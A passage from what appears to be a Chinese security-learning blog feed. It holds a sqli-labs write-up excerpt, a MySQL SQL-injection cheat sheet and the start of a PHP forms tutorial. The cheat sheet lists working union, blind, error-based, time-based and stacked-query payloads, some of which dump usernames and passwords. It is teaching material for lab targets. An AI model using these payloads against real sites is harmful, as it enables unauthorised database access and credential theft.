src="/2020/11/08/sqli/17.jpg" alt="17"></p><p><strong>爆值</strong><br> <code> and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --+</code></p><p><img src="/2020/11/08/sqli/18.jpg" alt="18"></p><p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;I-kill-you&#39;))))--+</code></p><p><img src="/2020/11/08/sqli/19.jpg" alt="19"></p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p><code>?id=1 and 1=2 --+</code>回显不正常，判断为数字型注入，把第一题中id=1后面的单引号去掉，其它保持不变。</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>输入单引号不报错，<code>?id=1&#39;)</code>也不报错<code>?id=1&quot;)</code>报错，加上<code>--+</code>后回显正常，故为与(“”)的方式闭合字符串类型；方法类似。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL基础</title>
    <link href="/2020/11/08/SQL/"/>
    <url>/2020/11/08/SQL/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。</p><ul><li><a href="#sql">SQL</a><ul><li><a href="#%E5%88%86%E7%B1%BB">分类</a><ul><li><a href="#%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B">变量类型</a></li><li><a href="#http%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F">HTTP提交方式</a></li><li><a href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">注入方式</a></li><li><a href="#%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98">编码问题</a></li></ul></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E5%BA%93mysql-50%E4%BB%A5%E4%B8%8A">信息数据库（MySql 5.0以上）</a><ul><li><a href="#information_schema"><strong>information_schema</strong></a></li><li><a href="#schemata%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><strong>SCHEMATA</strong>(所有数据库的基本信息)</a></li><li><a href="#tables%E5%AD%98%E5%82%A8%E8%A1%A8%E4%BF%A1%E6%81%AF"><strong>TABLES</strong>(存储表信息)</a></li><li><a href="#columns%E5%82%A8%E5%AD%98%E5%88%97%E4%BF%A1%E6%81%AF"><strong>COLUMNS</strong>(储存列信息)</a></li><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0">字符串连接函数</a></li></ul></li><li><a href="#%E5%9F%BA%E6%9C%AC%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B">基本手工注入流程</a><ul><li><a href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E6%95%B0">获取字段数</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">获取系统数据库名</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">获取当前数据库名</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8">获取数据库中的表</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5">获取表中的字段</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%90%84%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC">获取各个字段的值</a></li></ul></li><li><a href="#%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">常用注入方式</a><ul><li><a href="#union%E6%B3%A8%E5%85%A5">union注入</a></li><li><a href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E6%9E%84%E9%80%A0%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD">布尔注入(构造逻辑判断)</a><ul><li><a href="#regexp%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5">regexp正则注入</a></li><li><a href="#like%E5%8C%B9%E9%85%8D%E6%B3%A8%E5%85%A5">like匹配注入</a></li></ul></li><li><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">报错注入</a><ul><li><a href="#floor%E5%92%8Crand">floor()和rand()</a></li><li><a href="#extractvalue">extractvalue()</a></li><li><a href="#updatexml">updatexml()</a></li><li><a href="#geometrycollection">geometrycollection()</a></li><li><a href="#multipoint">multipoint()</a></li><li><a href="#polygon">polygon()</a></li><li><a href="#multipolygon">multipolygon()</a></li><li><a href="#linestring">linestring()</a></li><li><a href="#multilinestring">multilinestring()</a></li><li><a href="#exp">exp()</a></li></ul></li><li><a href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5">时间注入</a></li><li><a href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">堆叠查询注入</a></li><li><a href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">二次注入</a></li><li><a href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">宽字节注入</a></li></ul></li></ul></li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h4 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h4><ul><li>数字型</li><li>字符型</li></ul><h4 id="HTTP提交方式"><a href="#HTTP提交方式" class="headerlink" title="HTTP提交方式"></a>HTTP提交方式</h4><ul><li>GET注入</li><li>POST注入</li><li>Cookie注入</li></ul><h4 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h4><ul><li>报错注入</li><li>盲注<ul><li>布尔盲注</li><li>时间盲注</li></ul></li><li>union注入</li></ul><h4 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h4><ul><li>宽字节注入</li></ul><h2 id="信息数据库（MySql-5-0以上）"><a href="#信息数据库（MySql-5-0以上）" class="headerlink" title="信息数据库（MySql 5.0以上）"></a>信息数据库（MySql 5.0以上）</h2><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><strong>information_schema</strong></h4><p>系统数据库，记录当前数据库的数据库，表，列，用户权限信息。</p><h4 id="SCHEMATA-所有数据库的基本信息"><a href="#SCHEMATA-所有数据库的基本信息" class="headerlink" title="SCHEMATA(所有数据库的基本信息)"></a><strong>SCHEMATA</strong>(所有数据库的基本信息)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询数据库：union select 1,2,group_concat(schema_name) from information_schema.schemata </span><br></pre></td></tr></table></figure><h4 id="TABLES-存储表信息"><a href="#TABLES-存储表信息" class="headerlink" title="TABLES(存储表信息)"></a><strong>TABLES</strong>(存储表信息)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询表： union select 1,2,group_concat(table_name) from</span><br><span class="line">information_schema.tables where table_schema&#x3D;&#39;表名&#39; </span><br></pre></td></tr></table></figure><h4 id="COLUMNS-储存列信息"><a href="#COLUMNS-储存列信息" class="headerlink" title="COLUMNS(储存列信息)"></a><strong>COLUMNS</strong>(储存列信息)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询列：union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;表名&#39; </span><br></pre></td></tr></table></figure><h4 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h4><p>  concat(str1,str2,…)——没有分隔符地连接字符串</p><p>  concata_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p><p>  group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</p><h2 id="基本手工注入流程"><a href="#基本手工注入流程" class="headerlink" title="基本手工注入流程"></a>基本手工注入流程</h2><h4 id="获取字段数"><a href="#获取字段数" class="headerlink" title="获取字段数"></a>获取字段数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n</span><br></pre></td></tr></table></figure><h4 id="获取系统数据库名"><a href="#获取系统数据库名" class="headerlink" title="获取系统数据库名"></a>获取系统数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure><h4 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,database()</span><br></pre></td></tr></table></figure><h4 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure><p>但法二需一一查询表名。</p><h4 id="获取表中的字段"><a href="#获取表中的字段" class="headerlink" title="获取表中的字段"></a>获取表中的字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,group_concat(column_name) from information_shema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39;</span><br></pre></td></tr></table></figure><h4 id="获取各个字段的值"><a href="#获取各个字段的值" class="headerlink" title="获取各个字段的值"></a>获取各个字段的值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(username,password) from users&#x2F;&#x2F;假设已经获取到表名为user，且字段为username和password</span><br></pre></td></tr></table></figure><h2 id="常用注入方式"><a href="#常用注入方式" class="headerlink" title="常用注入方式"></a>常用注入方式</h2><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>union的作用是将两个sql语句进行联合。当注入参数的数据在数据库中不存在时，两个sql语句进行联合操作时，前一个语句选择的内容为空时，后面语句的查询内容就显示出来。如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D;-1 union select 1,2,3 </span><br></pre></td></tr></table></figure><h3 id="布尔注入-构造逻辑判断"><a href="#布尔注入-构造逻辑判断" class="headerlink" title="布尔注入(构造逻辑判断)"></a>布尔注入(构造逻辑判断)</h3><p>boolean 根据注入信息返回true or fales,无任何报错</p><p><strong>相关函数</strong></p><p><strong>length(str)</strong> ：返回字符串str的长度</p><p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p><p><strong>mid(str,pos,len)</strong> ：跟substr一样，截取字符串</p><p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p><p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#39; and length (database())&#x3D;x(某个值，用大于或者小于某个值也可以)--+&#x2F;&#x2F;猜数据库名长度：(猜对时页面才会显示正常)</span><br><span class="line"></span><br><span class="line">&#39; and length((select schema_name from information_schema.schemata limit 0,1))&#x3D;18 --+ &#x2F;&#x2F;查询所有数据库的长度</span><br><span class="line"></span><br><span class="line">&#39; and left(database(),1)&#x3D;&#39;s&#39;--+ &#x2F;&#x2F;猜数据库的名字 </span><br><span class="line"></span><br><span class="line">&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)) &#x3D; 101--+&#x2F;&#x2F;获取数据库下的表</span><br><span class="line"></span><br><span class="line">&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; limit 0,1))&#x3D;9 --+ 查询表的长度</span><br><span class="line"></span><br><span class="line">&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1)--+&#x2F;&#x2F;获取表里的列名</span><br><span class="line"></span><br><span class="line">&#39; and length((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;users&quot;limit 0,1))&gt;1 --+ &#x2F;&#x2F;查询列的长度</span><br><span class="line"></span><br><span class="line">&#39; and ord(mid((select ifnull(cast(username as char),x（错误返回值）)from security.users order by id limit 0,1),1,1))&#x3D;68--+ &#x2F;&#x2F;获取列的内容</span><br></pre></td></tr></table></figure><h4 id="regexp正则注入"><a href="#regexp正则注入" class="headerlink" title="regexp正则注入"></a>regexp正则注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#39; and 1&#x3D;(user() regexpri&#39;^&#39;) --+&#x2F;&#x2F;查看当前操作的用户</span><br><span class="line"> </span><br><span class="line">&#39; and 1&#x3D;(database() regexp&#39;^s&#39;) --+&#x2F;&#x2F;查看当前数据库</span><br><span class="line"></span><br><span class="line">&#39; and ((select schema_name from information_schema.schemata limit 0,1) regexp&#39;^i[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测第一个数据库的名字</span><br><span class="line"> </span><br><span class="line">&#39; and ((select table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; limit 0,1)regexp &#39;^g[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测dvwa数据库里第一个表的名字</span><br><span class="line"> </span><br><span class="line">&#39; and ((select column_name from information_schema.columns where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39; limit 0,1) regexp &#39;^u[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测dvwa数据库里的users表里的第一个值</span><br><span class="line"> </span><br><span class="line">&#39; and ((select user from dvwa.users limit 0,1) regexp &#39;^a[a-z]&#39; )&#x3D;1 --+&#x2F;&#x2F;正则猜测dvwa数据库里的users表里的user字段里的第一个值</span><br></pre></td></tr></table></figure><h4 id="like匹配注入"><a href="#like匹配注入" class="headerlink" title="like匹配注入"></a>like匹配注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() like &#39;ro%&#39;</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="floor-和rand"><a href="#floor-和rand" class="headerlink" title="floor()和rand()"></a>floor()和rand()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a   &#x2F;&#x2F;利用错误信息得到当前数据库名</span><br></pre></td></tr></table></figure><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and extractvalue(1,concat(0x7e,(select user()),0x7e))</span><br></pre></td></tr></table></figure><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br></pre></td></tr></table></figure><h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a>multipolygon()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5)) --+&#x2F;&#x2F;如果前面执行的正确执行0就为假 ,如果前面错误则执行后面sleep(5)延迟5秒</span><br></pre></td></tr></table></figure><h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; 1&#39;;select if(sub(user(),1,1)&#x3D;&#39;r&#39;,sleep(3),1)%23</span><br></pre></td></tr></table></figure><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><img src="/2020/11/08/SQL/%E5%95%A6%E5%95%A6%E5%95%A6.jpg" alt="啦啦啦"></p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><img src="/2020/11/08/SQL/%E5%93%88%E5%93%88%E5%93%88.jpg" alt="哈哈哈"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php(三)</title>
    <link href="/2020/11/04/php(%E4%B8%89)/"/>
    <url>/2020/11/04/php(%E4%B8%89)/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP（三）"><a href="#PHP（三）" class="headerlink" title="PHP（三）"></a>PHP（三）</h1><ul><li><a href="#php%E4%B8%89">PHP（三）</a><ul><li><a href="#php-%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4">PHP 命名空间</a><ul><li><a href="#%E5%AE%9A%E4%B9%89">定义</a></li></ul></li><li><a href="#php%E8%A1%A8%E5%8D%95">php表单</a><ul><li><a href="#php-%E4%B8%8B%E6%8B%89%E8%8F%9C%E5%8D%95%E5%8D%95%E9%80%89">PHP 下拉菜单单选</a></li><li><a href="#php-%E4%B8%8B%E6%8B%89%E8%8F%9C%E5%8D%95%E5%A4%9A%E9%80%89">PHP 下拉菜单多选</a></li></ul></li><li><a href="#php-%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81">PHP 表单验证</a><ul><li><a href="#php-%E9%AA%8C%E8%AF%81%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE">PHP 验证表单数据</a></li><li><a href="#php-%E8%A1%A8%E5%8D%95---%E5%BF%85%E9%9C%80%E5%AD%97%E6%AE%B5">PHP 表单 - 必需字段</a></li></ul></li><li><a href="#%E9%AA%8C%E8%AF%81%E9%82%AE%E4%BB%B6%E5%92%8Curl">验证邮件和URL</a><ul><li><a href="#php---%E9%AA%8C%E8%AF%81%E5%90%8D%E7%A7%B0">PHP - 验证名称</a></li></ul></li><li><a href="#php-%E5%A4%9A%E7%BB%B4%E6%95%B0%E7%BB%84">PHP 多维数组</a></li><li><a href="#date-%E5%87%BD%E6%95%B0">date() 函数</a></li><li><a href="#php-%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6">PHP 包含文件</a><ul><li><a href="#include-%E5%92%8C-require-%E8%AF%AD%E5%8F%A5">include 和 require 语句:</a></li></ul></li><li><a href="#php-%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">PHP 文件处理</a><ul><li><a href="#%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6">打开文件</a></li><li><a href="#feof-%E5%87%BD%E6%95%B0">feof() 函数</a></li></ul></li><li><a href="#php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">PHP文件上传</a><ul><li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A1%A8%E5%8D%95">创建一个文件上传表单</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC">创建上传脚本</a></li></ul></li><li><a href="#php-cookie">PHP Cookie</a></li><li><a href="#php-session">PHP Session</a></li><li><a href="#php-%E5%8F%91%E9%80%81%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6">PHP 发送电子邮件</a><ul><li><a href="#php-mail-%E5%87%BD%E6%95%B0">PHP mail() 函数</a></li><li><a href="#php-e-mail-%E6%B3%A8%E5%85%A5">PHP E-mail 注入</a></li></ul></li><li><a href="#php-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">PHP 错误处理</a><ul><li><a href="#%E4%BD%BF%E7%94%A8-die-%E5%87%BD%E6%95%B0">使用 die() 函数</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E5%99%A8">创建自定义错误处理器</a></li><li><a href="#%E8%AE%BE%E7%BD%AE%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F">设置错误处理程序</a></li><li><a href="#%E8%A7%A6%E5%8F%91%E9%94%99%E8%AF%AF-trigger_error">触发错误： trigger_error()</a></li><li><a href="#%E9%94%99%E8%AF%AF%E8%AE%B0%E5%BD%95">错误记录</a></li></ul></li><li><a href="#php-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">PHP 异常处理</a><ul><li><a href="#trythrow-%E5%92%8C-catch">Try、throw 和 catch</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84-exception-%E7%B1%BB%E7%BB%A7%E6%89%BF%E4%BA%86-php-%E7%9A%84-exception-%E7%B1%BB%E7%9A%84%E6%89%80%E6%9C%89%E5%B1%9E%E6%80%A7%E5%8F%AF%E5%90%91%E5%85%B6%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84%E5%87%BD%E6%95%B0">创建一个自定义的 Exception 类（继承了 PHP 的 exception 类的所有属性，可向其添加自定义的函数）</a></li></ul></li><li><a href="#php-%E8%BF%87%E6%BB%A4%E5%99%A8">PHP 过滤器</a><ul><li><a href="#%E9%AA%8C%E8%AF%81%E8%BE%93%E5%85%A5">验证输入</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E5%A4%9A%E4%B8%AA%E8%BE%93%E5%85%A5filter_var_array-%E6%88%96-the-filter_input_array">过滤多个输入：filter_var_array 或 the filter_input_array</a></li><li><a href="#filter-callback">Filter Callback</a></li></ul></li><li><a href="#php-json">PHP JSON</a><ul><li><a href="#json_encode%E7%94%A8%E4%BA%8E%E5%AF%B9%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C-json-%E7%BC%96%E7%A0%81">json_encode：用于对变量进行 JSON 编码</a></li><li><a href="#%E5%B0%86-php-%E5%AF%B9%E8%B1%A1%E8%BD%AC%E6%8D%A2%E4%B8%BA-json-%E6%A0%BC%E5%BC%8F%E6%95%B0%E6%8D%AE">将 PHP 对象转换为 JSON 格式数据</a></li><li><a href="#json_decode">json_decode</a></li></ul></li></ul></li></ul><h2 id="PHP-命名空间"><a href="#PHP-命名空间" class="headerlink" title="PHP 命名空间"></a>PHP 命名空间</h2><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">&#x2F;&#x2F; 定义代码在 &#39;MyProject&#39; 命名空间中  </span><br><span class="line">namespace MyProject;  </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; ... 代码 ...  </span><br></pre></td></tr></table></figure><p>可以在同一个文件中定义不同的命名空间代码。全局代码必须用一个不带名称的 namespace 语句加上大括号括起来。 declare 是唯一可以放在命名空间前的语句。所有非 PHP 代码包括空白符都不能出现在命名空间的声明之前。</p><h2 id="php表单"><a href="#php表单" class="headerlink" title="php表单"></a>php表单</h2><h4 id="PHP-下拉菜单单选"><a href="#PHP-下拉菜单单选" class="headerlink" title="PHP 下拉菜单单选"></a>PHP 下拉菜单单选</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$q &#x3D; isset($_GET[&#39;q&#39;])? htmlspecialchars($_GET[&#39;q&#39;]) : &#39;&#39;;</span><br><span class="line">if($q) &#123;</span><br><span class="line">        if($q &#x3D;&#x3D;&#39;JD&#39;) &#123;</span><br><span class="line">                echo &#39;京东&lt;br&gt;http:&#x2F;&#x2F;www.JD.com&#39;;</span><br><span class="line">        &#125; else if($q &#x3D;&#x3D;&#39;baidu&#39;) &#123;</span><br><span class="line">                echo &#39; 百度&lt;br&gt;http:&#x2F;&#x2F;www.baidu.com&#39;;</span><br><span class="line">        &#125; else if($q &#x3D;&#x3D;&#39;TAOBAO&#39;) &#123;</span><br><span class="line">                echo &#39;淘宝&lt;br&gt;http:&#x2F;&#x2F;www.taobao.com&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt; </span><br><span class="line">    &lt;select name&#x3D;&quot;q&quot;&gt;</span><br><span class="line">    &lt;option value&#x3D;&quot;&quot;&gt;选择一个站点:&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;option value&#x3D;&quot;JD&quot;&gt;JD&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;option value&#x3D;&quot;baidu&quot;&gt;baidu&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;option value&#x3D;&quot;TAOBAO&quot;&gt;Taobao&lt;&#x2F;option&gt;</span><br><span class="line">    &lt;&#x2F;select&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="PHP-下拉菜单多选"><a 